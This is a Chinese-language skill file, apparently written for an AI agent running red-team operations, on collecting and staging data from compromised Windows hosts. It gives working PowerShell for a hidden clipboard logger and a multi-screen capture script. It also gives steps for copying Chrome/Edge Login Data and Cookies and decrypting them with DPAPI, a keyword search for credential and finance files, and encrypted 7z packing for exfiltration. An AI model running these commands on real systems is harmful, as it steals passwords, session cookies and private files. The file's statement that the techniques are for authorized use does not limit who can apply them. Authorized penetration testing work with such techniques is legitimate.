---
name: collection-staging
description: >-
  数据蒐集与暂存:剪贴簿监听,浏览器数据(Login Data/Cookies+DPAPI),文件staging与关键字定位,多屏幕截图,加密打包最小化落地,与cleanup-rollback台账銜接。Use when collecting clipboard, browser data, staging files, or taking screenshots during authorized ops.
metadata:
  tags: [渗透测试, penetration-testing, 红队]
---

## 数据蒐集 / 暂存 Staging

> 声明:本 Skill 所有手法仅限授权范围内使用(蒐集范围以 SOW 清单为准,超出清单的数据一律不碰)。每一份拷贝都有归属(哪个 finding 用)、有去向(外传到哪)、有终点(何时删),全部记入 `pentest-output-standards` 改动台账。

```
=== 剪贴簿监听 ===
PowerShell循环(轻量,无第三方依赖): while($true){$t=Get-Clipboard -Raw;if($t -ne $prev -and $t){$t|Out-File -Append clip.log;$prev=$t};Start-Sleep -Milliseconds 500}
  部署: 计划任务/隐藏窗口拉起;频控已内建(仅记录变化项,避免日志爆炸)
  验证(证据): clip.log 含时间戳与敏感条目(密码复制/内部URL)且格式可解析
  回滚/清理: 进程kill+clip.log回传后删除,台账一行;监听期间不落明文敏感项到其他位置
=== 浏览器数据 ===
Chrome/Edge数据位置: %LOCALAPPDATA%\Google\Chrome\User Data\Default\(Login Data=密码库/Cookies=会话/History)
  步骤: 退出浏览器或绕文件锁(esentutl /r /d 或直接copy,SQLite可能缺WAL) → 拷贝DB到staging → DPAPI解密(见`credential-access`,同用户在线上下文可直接解;跨用户需masterkey)
  验证: 解出 URL+用户名+密码 对且抽测登录成功;Cookie导入可复用会话(证据=登录后页面标题截图)
  回滚/清理: 拷贝的DB用完即删;原始User Data目录不改动(时间戳都别碰)
=== 文件 staging ===
定位: everything/Get-ChildItem -Recurse按关键字(密码/账密/合同/财务/备份/cred/secret/conf) + 输出清单先给用户确认范围(超出SOW不碰,负结果也记录)
打包落地最小化: 优先内存盘(Linux /dev/shm;Windows选已有加密目录),7z a -p'<强口令>' -mhe=on打包 → 走`exfil-execution`通道外传
  验证: 7z t完整性通过;收集清单与实际包内清单逐项比对一致
  回滚/清理: staging目录在外传校验通过后shred -u/sdelete;台账留"收集→外传→销毁"三段链
=== 多屏幕截图 ===
PowerShell(AllScreens遍历多屏): Add-Type -AssemblyName System.Windows.Forms,System.Drawing;[System.Windows.Forms.Screen]::AllScreens|%{ $b=New-Object Drawing.Bitmap $_.Bounds.Width,$_.Bounds.Height;$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($_.Bounds.Location,[Drawing.Point]::Empty,$_.Bounds.Size);$b.Save("$env:TEMP\shot_$($_.DeviceName.TrimStart('.\').TrimEnd(':'))_$(Get-Date -f yyyyMMdd_HHmmss).png") }
  备选: nircmd savescreenshotfull / imagemagick import -window root(多屏拼接)
  频控: 关键动作触发(登录成功后/敏感页面停留)而非定时轮拍 — 定时截图=磁盘增长+进程行为两个告警点
  验证(证据): PNG分辨率与目标多屏布局一致;文件名带时间戳进证据目录
  回滚/清理: 截图回传后目标侧删除;本地证据库只留hash+缩略记录(证据链见`pentest-output-standards`)
=== 与 cleanup-rollback 的銜接 ===
🚨所有staging产物(clip.log/DB拷贝/截图/打包)都是台账行: #|时间|主机|类型|位置|内容|回滚命令
交付前: 按`pentest-output-standards`台账逆序生成一键回滚脚本,系统绝不擅自清理(清不清交用户决定)
验证: 回滚后复查(产物不存在+原始数据完好)=清理闭环
> 蒐集的纪律不是"多拿",是"每件都有账"。拿的时候问三句: 授权里有吗?哪个finding用?何时删?
```
